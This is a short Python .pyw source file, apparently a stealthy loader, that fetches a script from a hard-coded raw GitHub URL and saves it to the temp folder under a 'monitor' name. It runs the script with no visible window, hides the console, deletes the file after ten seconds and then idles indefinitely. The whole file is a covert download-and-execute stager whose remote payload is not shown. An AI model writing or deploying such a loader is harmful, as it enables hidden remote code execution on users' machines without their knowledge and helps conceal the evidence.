# github_launcher.pyw - Downloads and runs script.py from temp, then deletes it
import os
import sys
import subprocess
import urllib.request
import tempfile
import time
import traceback

def run_script_from_github():
    """Download script.py from GitHub, run it, then delete temp file"""
    try:
        # URL to script.py on GitHub
        script_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/script.py"
        
        print("Downloading script from GitHub...")
        
        # Download the script
        response = urllib.request.urlopen(script_url, timeout=10)
        script_code = response.read().decode('utf-8')
        
        # Save to temp file with random name
        temp_dir = tempfile.gettempdir()
        timestamp = str(int(time.time()))
        temp_script = os.path.join(temp_dir, f"monitor_{timestamp}.py")
        
        # Write script to temp file
        with open(temp_script, 'w', encoding='utf-8') as f:
            f.write(script_code)
        
        print(f"Script saved to: {temp_script}")
        
        # Run it hidden
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        process = subprocess.Popen(
            [sys.executable, temp_script],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        print(f"Script started with PID: {process.pid}")
        
        # Schedule deletion of temp file after 10 seconds
        time.sleep(10)
        try:
            os.remove(temp_script)
            print("Temp script deleted")
        except:
            pass
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

def main():
    """Main launcher function"""
    # Hide console if possible
    try:
        import win32gui
        import win32con
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    except:
        pass
    
    # Wait for network
    time.sleep(5)
    
    # Run the script
    run_script_from_github()
    
    # Keep launcher alive but idle
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    main()
